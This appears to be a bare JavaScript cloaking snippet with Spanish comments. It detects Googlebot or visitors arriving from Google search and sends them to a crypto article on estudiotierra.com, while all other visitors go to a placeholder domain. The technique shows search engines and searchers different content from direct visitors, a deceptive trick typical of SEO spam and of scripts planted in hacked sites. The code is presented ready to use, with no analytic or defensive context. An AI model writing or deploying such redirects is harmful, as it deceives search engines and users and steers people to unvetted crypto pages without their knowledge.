(function() {
    var userAgent = navigator.userAgent.toLowerCase();
    var referrer = document.referrer.toLowerCase();

    // Detectar Googlebot
    var isGoogleBot = userAgent.includes("googlebot");

    // Detectar si viene desde Google (búsqueda)
    var isFromGoogle = referrer.includes("google.");

    if (isGoogleBot || isFromGoogle) {
        // Redirección para Google o Googlebot
        window.location.href = "https://estudiotierra.com/articulo-cripto.html";
    } else {
        // Redirección para usuarios normales
        window.location.href = "https://ejemplo.com";
    }
})();